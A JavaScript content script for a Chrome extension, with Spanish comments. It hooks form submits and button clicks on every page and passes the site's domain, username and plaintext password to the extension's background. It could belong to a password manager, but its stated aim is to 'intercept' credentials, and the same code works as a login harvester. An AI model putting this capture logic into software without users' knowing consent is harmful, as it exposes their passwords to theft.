// content_script.js - Inyectado en páginas web para interceptar credenciales

// Escuchar eventos de submit en formularios
document.addEventListener('submit', (e) => {
  const form = e.target;
  if (!form) return;

  const passwordInput = form.querySelector('input[type="password"]');
  if (!passwordInput || !passwordInput.value) return;

  // Buscar el input de usuario en el mismo formulario
  const usernameInput = form.querySelector('input[type="text"], input[type="email"], input[type="search"], input:not([type])');
  const username = usernameInput ? usernameInput.value.trim() : '';
  const password = passwordInput.value;
  const domain = window.location.hostname;

  if (username && password) {
    chrome.runtime.sendMessage({
      type: 'SUBMIT_CREDENTIALS',
      domain: domain,
      username: username,
      password: password
    });
  }
}, true);

// Escuchar clics en botones de envío por si se usan frameworks SPA que no disparan "submit" estándar
document.addEventListener('click', (e) => {
  const button = e.target.closest('button, input[type="submit"], input[type="button"]');
  if (!button) return;

  // Si el botón está dentro de un formulario, el evento 'submit' ya lo capturará.
  // Solo actuamos si no hay un formulario explícito submit.
  const form = button.closest('form');
  if (form) return; 

  // Buscar inputs de contraseña en la página cercanos al botón
  const inputs = Array.from(document.querySelectorAll('input[type="password"]'));
  if (inputs.length === 0) return;

  // Encontrar el input de contraseña más cercano visualmente o en el DOM al botón
  let closestPasswordInput = null;
  let minDistance = Infinity;

  inputs.forEach(input => {
    // Distancia simple en el DOM
    const distance = Math.abs(
      Array.from(document.querySelectorAll('*')).indexOf(input) - 
      Array.from(document.querySelectorAll('*')).indexOf(button)
    );
    if (distance < minDistance) {
      minDistance = distance;
      closestPasswordInput = input;
    }
  });

  if (!closestPasswordInput || !closestPasswordInput.value) return;

  // Buscar el input de usuario más cercano al input de contraseña
  const allInputs = Array.from(document.querySelectorAll('input'));
  const pwIdx = allInputs.indexOf(closestPasswordInput);
  
  let closestUsernameInput = null;
  // Buscar hacia atrás desde el password input
  for (let i = pwIdx - 1; i >= 0; i--) {
    const input = allInputs[i];
    if (input.type === 'text' || input.type === 'email' || input.type === 'search' || !input.type) {
      closestUsernameInput = input;
      break;
    }
  }

  const username = closestUsernameInput ? closestUsernameInput.value.trim() : '';
  const password = closestPasswordInput.value;
  const domain = window.location.hostname;

  if (username && password) {
    chrome.runtime.sendMessage({
      type: 'SUBMIT_CREDENTIALS',
      domain: domain,
      username: username,
      password: password
    });
  }
}, true);
